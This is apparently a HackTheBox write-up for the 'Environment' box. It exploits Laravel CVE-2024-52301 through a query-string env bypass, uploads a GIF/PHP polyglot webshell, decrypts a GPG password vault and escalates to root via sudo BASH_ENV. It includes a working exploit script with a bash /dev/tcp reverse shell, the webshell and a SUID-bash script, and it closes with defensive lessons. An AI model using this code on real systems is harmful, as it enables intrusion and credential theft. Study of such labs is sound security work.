---
title: "Environment"
date: 2025-05-03
type: docs
tags:
  - htb
  - linux
  - medium
  - laravel
  - cve-2024-52301
  - env-manipulation
  - file-upload
  - polyglot
  - gpg
  - keyvault
  - sudo
  - bash-env
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Debian 12), **Difficulty:** Medium, **Released:** 2025-05-03, **IP:** `10.10.11.67` , `environment.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Laravel app. Appending `?--env=preprod` to the login POST flips the framework into a different environment where the login flow has a debug branch you can pass (**CVE-2024-52301**, Laravel environment detection via `argv`).
2. Authenticated, the profile image **upload** accepts a `GIF87a` prefixed polyglot with a trailing dot filename (`name.php.`). PHP webshell lands in `/storage/files/`. Shell as `www-data`.
3. `www-data` can read `/home/hish/.gnupg`. Copy it, list the secret key, and `gpg --decrypt /home/hish/backup/keyvault.gpg` yields a password vault. `su hish` with `marineSPm@ster!!`.
4. `hish` may `sudo /usr/bin/systeminfo`, and `sudo` keeps `BASH_ENV`. Point `BASH_ENV` at a script that SUIDs bash. Root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| GPG keyvault, `ENVIRONMENT.HTB` entry | `hish : marineSPm@ster!!` |
| `user.txt` | `/home/hish/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Environment was the box that made me appreciate how a single misconfigured PHP setting can undermine an entire framework's security model. **CVE-2024-52301** is a genuinely subtle Laravel bug, and I spent time making sure I understood the mechanism before I trusted the exploit: Laravel reads `--env=<name>` out of the process `argv` to decide which environment it should run as, and because PHP's `register_argc_argv` was left on for the web SAPI (Debian's default, notably), the query string itself gets parsed into `$_SERVER['argv']`. That means a request as simple as `?--env=preprod` actually flips the running environment for that single request, and if the `preprod` environment has a weaker code path anywhere, a debug login branch, verbose errors, disabled CSRF, I get to hit it from the outside with nothing more than a query parameter. On this box, `preprod` turned out to have exactly that: a login controller branch that would authenticate me without valid credentials.

From there, I moved into more familiar territory. The next hurdle was a **polyglot file upload**, where I combined GIF magic bytes with a trailing dot in the filename to slip past the extension check, and the final privilege escalation leaned on **`sudo` plus `BASH_ENV`**, where `sudo` had been configured to preserve `BASH_ENV` across its environment reset and bash dutifully sources whatever that variable points to before running any script. Each of these three stages is a well-known technique on its own, but chaining a brand-new CVE into two evergreen ones is what made this box worth documenting carefully.

Related Laravel boxes: [EarlyAccess](/writeups/hackthebox/linux/medium/earlyaccess/). Related polyglot upload: [Magic](/writeups/hackthebox/linux/medium/magic/), [PopCorn](/writeups/hackthebox/linux/medium/popcorn/), [Usage](/writeups/hackthebox/linux/easy/usage/). Related `sudo` env keeping (`LD_PRELOAD`, `BASH_ENV`, `PYTHONPATH`): this is the reference `BASH_ENV` case. Related GPG keyvault: [Bolt](/writeups/hackthebox/linux/medium/bolt/).

---

## Full Walkthrough

### Foothold, Laravel env bypass plus upload

<div class="callout callout-note">

**CVE-2024-52301, Laravel environment manipulation**

Digging into the root cause, I found that Laravel's `Application::detectEnvironment()` checks `$_SERVER['argv']` for a `--env=<name>` argument before it ever falls back to the configured `APP_ENV`. That check makes sense for a CLI context, but it becomes a real problem the moment `register_argc_argv = On` is set for the web SAPI, which is Debian's default. With that setting active, PHP parses the request's query string straight into `argv`, so a request to `/login?--env=preprod` convinces Laravel it's running in the `preprod` environment for the duration of that request. From there, the impact depends entirely on what that environment's code paths look like: a debug login shortcut, verbose error output, disabled CSRF protection, or a seeded test account are all fair game if they exist anywhere in the environment-specific logic. The fix landed in Laravel 6.20.45 / 7.30.7 / 8.83.28 / 9.52.17 / 10.48.23 / 11.31.0. On this box specifically, flipping into `preprod` let the login controller authenticate me with no valid credentials at all.

</div>

Once I'd confirmed the environment bypass by hand, I scripted the whole chain so it would run reliably end to end: authenticate via `?--env=preprod`, upload a GIF/PHP polyglot to the profile handler, then hit the uploaded file directly to trigger a reverse shell.

```python
import requests, re, io

base_url = 'http://environment.htb'
login_url = base_url + '/login'
fname = "baphometpwn2.php"

def get_csrf(url, req_cookies={}):
    res = requests.get(url, cookies=req_cookies, allow_redirects=False)
    return re.search(r'name="_token" value="(\w+)"', res.text).group(1), res

def extract_cookies(res):
    return {'laravel_session': res.cookies.get('laravel_session'),
            'XSRF-TOKEN': res.cookies.get('XSRF-TOKEN')}

def login(csrf_token, cookies):
    data = {'email': 'email@example.com', 'password': 'admin',
            '_token': csrf_token, 'remember': 'True'}
    res = requests.post(login_url + '?--env=preprod', data=data,
                        cookies=cookies, allow_redirects=False)
    assert res.status_code == 302
    return extract_cookies(res)

def upload_webshell(cookies, fname):
    webshell = '''GIF87a
<html><body>
<form method="GET"><input name="cmd"><input type="SUBMIT"></form>
<pre><?php if(isset($_GET['cmd'])) system($_GET['cmd']); ?></pre>
</body></html>'''
    csrf_token, _ = get_csrf(base_url + '/management/profile', cookies)
    files = {'upload': (fname + '.', io.BytesIO(webshell.encode()), 'image/jpeg')}
    requests.post(base_url + '/upload', files=files, data={'_token': csrf_token},
                  cookies=cookies, allow_redirects=False)

def start_reverse_shell(fname):
    IP, PORT = '10.10.14.4', 9002
    url = (f'http://environment.htb/storage/files/{fname}'
           f'?cmd=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F{IP}%2F{PORT}+0%3E%261%27')
    requests.get(url, allow_redirects=False)

csrf_token, res = get_csrf(login_url)
cookies = login(csrf_token, extract_cookies(res))
upload_webshell(cookies, fname)
start_reverse_shell(fname)
```

<div class="callout callout-note">

**The upload bypass**

Looking at how the profile image handler validates uploads, I found it does two checks: it compares the extension against a blocklist and sniffs the first bytes for a valid image signature. I could satisfy both at once. `GIF87a\n<?php ...` passes the signature check because it starts with a legitimate GIF header, and naming the file with a **trailing dot** (`shell.php.`) gets it stored by PHP/Laravel as `shell.php` on Linux, since the trailing dot is silently stripped by the filesystem layer, while a naive `pathinfo($name, PATHINFO_EXTENSION)` check on the original name sees an empty extension and lets it through. The end result lands in `/storage/files/`, which is web-served and executes as PHP, giving me a working webshell from a file that technically passed every validation the application ran on it.

</div>

### www-data to hish, GPG keyvault

As `www-data`, I went looking for the usual local privesc leads. I found a database dump sitting in the web directory, but the password hashes inside it didn't crack against any wordlist I threw at them, so I moved on rather than sinking more time into that dead end. What did pan out was checking file permissions on other users' home directories: `hish`'s `~/.gnupg` turned out to be world-readable, which is effectively an invitation to copy the private key and start decrypting whatever it protects.

```console
$ cp -r /home/hish/.gnupg /tmp/.gnupg && chmod -R 700 /tmp/.gnupg
$ gpg --homedir /tmp/.gnupg --list-secret-keys --no-permission-warning
sec   rsa2048 2025-01-11 [SC]
      F45830DFB638E66CD8B752A012F42AE5117FFD8E
uid           [ultimate] hish_ <hish@environment.htb>

$ gpg --homedir /tmp/.gnupg --decrypt /home/hish/backup/keyvault.gpg
PAYPAL.COM      -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM    -> summerSunnyB3ACH!!
```

<div class="callout callout-note">

**Why a readable `.gnupg` is game over**

The reason I treat a readable `.gnupg` directory as effectively game over is that it contains the **private key** itself, stored under `private-keys-v1.d/` on modern GPG or `secring.gpg` on older setups. Once I can copy that directory, I can point `gpg --homedir` at my own copy and use the key exactly as `hish` would, with no passphrase prompt at all if the key has none, or a crackable one if I need to run it through `gpg2john` first. That access unlocks anything the user ever encrypted for their own use: backups, password vaults, private notes, all of it becomes readable the moment the keyring itself is exposed. The fix is simple and something I check for on every box now: `~/.gnupg` should be mode `700`, and no service account should ever be able to read into another user's home directory in the first place.

</div>

Out of the three decrypted entries, the `ENVIRONMENT.HTB` one was obviously the credential meant for this box, so I used it to switch users directly.

```bash
su hish        # marineSPm@ster!!
```

### hish to root, sudo plus BASH_ENV

As `hish`, checking `sudo` privileges is always my first move, since it tells me immediately whether there's a sanctioned path to root worth chasing.

```console
$ sudo -l
Matching Defaults entries for hish on environment:
    env_reset, env_keep+="ENV BASH_ENV", use_pty
User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

<div class="callout callout-note">

**`BASH_ENV` injection**

The detail that caught my eye in that `sudo -l` output was `env_keep+="ENV BASH_ENV"`. `BASH_ENV` names a file that a non-interactive bash shell **sources before running a script**, and `systeminfo` is itself a bash script. Because `sudo` was explicitly configured to preserve `BASH_ENV` across its usual environment reset, I effectively controlled a file that root's bash would execute before `systeminfo` ever ran, which turns an allowed-but-narrow `sudo` entry into unrestricted code execution as root.

</div>

```bash
cat > /home/hish/pwn.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
EOF
sudo BASH_ENV=/home/hish/pwn.sh /usr/bin/systeminfo
/tmp/bash -p
cat /root/root.txt
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/hish/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **`register_argc_argv` should be off for the web SAPI, full stop.** The whole first stage of this box exists because a CLI convenience, reading `--env=` from `argv`, was still reachable through a web request. I'd tell any team running Laravel (or honestly any PHP framework that reads `argv` for configuration) to turn that setting off for anything served by PHP-FPM or mod_php, and to patch to a version past CVE-2024-52301 regardless. Letting query strings masquerade as command-line arguments is a whole class of surprises waiting to happen.
- **Environment-specific code paths must never be weaker than production.** Whatever convenience a `preprod` or `staging` environment offers, a debug login shortcut, disabled CSRF, verbose stack traces, it has to assume that environment is reachable from the outside, because on this box it was just a query parameter away. I treat "environment detection" as an attack surface now, not just a deployment convenience.
- **Validate uploads by re-encoding, not by inspecting.** Signature sniffing and extension blocklists are both bypassable, as this box demonstrated cleanly. The more robust approach is to decode and re-encode any uploaded image through a trusted library, which strips out anything that isn't valid image data, and to serve the upload directory with PHP execution disabled entirely so that even a successful upload can't run as code.
- **Home directories need real permission discipline.** `~/.gnupg`, `~/.ssh`, and `~/.aws` should all be mode `700` and owned exclusively by the user in question. A service account like `www-data` should never have a path into another user's private key material, and I now treat any world-readable dotfile directory as a finding worth escalating on its own.
- **`env_keep` quietly defeats the point of `sudo`.** Preserving `BASH_ENV`, `ENV`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PYTHONPATH`, or `PERL5LIB` across a `sudo` invocation hands the calling user a way to inject code into whatever runs next, no matter how narrowly the allowed command itself is scoped. `env_reset` with no exceptions is the only configuration I'd sign off on for any `sudo` rule that executes a script or interpreter.

---

## Related Writeups

- **Laravel:** [EarlyAccess](/writeups/hackthebox/linux/medium/earlyaccess/)
- **Polyglot / trailing dot upload bypass:** [Magic](/writeups/hackthebox/linux/medium/magic/), [PopCorn](/writeups/hackthebox/linux/medium/popcorn/), [Usage](/writeups/hackthebox/linux/easy/usage/), [Heal](/writeups/hackthebox/linux/medium/heal/)
- **GPG keyvault to credentials:** [Bolt](/writeups/hackthebox/linux/medium/bolt/)
- **`sudo` env keeping to root (`BASH_ENV` / `LD_PRELOAD`):** [Environment](/writeups/hackthebox/linux/medium/environment/) is the reference case

## References

- CVE-2024-52301 (Laravel) <https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h>
- GTFOBins bash BASH_ENV <https://gtfobins.github.io/gtfobins/bash/#sudo>
- PHP register_argc_argv <https://www.php.net/manual/en/ini.core.php#ini.register-argc-argv>
